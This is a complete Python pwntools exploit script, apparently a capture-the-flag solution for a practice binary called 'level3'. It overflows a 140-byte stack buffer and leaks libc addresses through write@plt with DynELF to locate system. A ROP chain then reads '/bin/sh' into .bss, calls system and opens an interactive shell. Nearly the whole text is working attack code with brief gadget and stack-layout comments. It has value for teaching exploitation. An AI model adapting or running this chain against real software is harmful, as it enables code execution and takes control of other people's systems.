#!/usr/bin/env python
from pwn import *
from pwnlib import gdb

elf = ELF('./level3')
p = process('./level3')
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(p)

plt_write = elf.plt['write']
plt_read = elf.plt['read']
foo = elf.symbols['foo']
bss = elf.bss()
make_stack_blance = 0x80484cb # mov ebp, esp; and esp, 0xfffffff0; call foo
def leak(address):
    l_payload = 'A' * 140
    l_payload += p32(plt_write)
    l_payload += p32(make_stack_blance) #old is foo
    l_payload += p32(1)
    l_payload += p32(address)
    l_payload += p32(4)
    p.send(l_payload)
#both are good
    p.recvline()
    #p.recvuntil('read address\n') #bypass ...
    data = p.recv(4)
    print('\t%x ==> %s' % (address, data.encode('hex')))
    return data

dyn = DynELF(leak, elf= ELF('./level3'))
system = dyn.lookup('__libc_system', 'libc')
'''
    ROPgadget --binary level3 --only "pop|ret"
'''
ret2pop = 0x0804853d
'''
    read(0, bss, 8) <== '/bin/sh\0'
    pop; pop; pop; ret
    system(bss)
stack:
    arg2
    arg1
    new_ret
    ret
    'A' * 140
'''
payload = 'A' * 140 + p32(plt_read) + p32(ret2pop) + p32(0) + p32(bss) + p32(8)
payload += p32(system) + p32(0xcfcfcfcf) + p32(bss)
p.send(payload)
p.interactive()
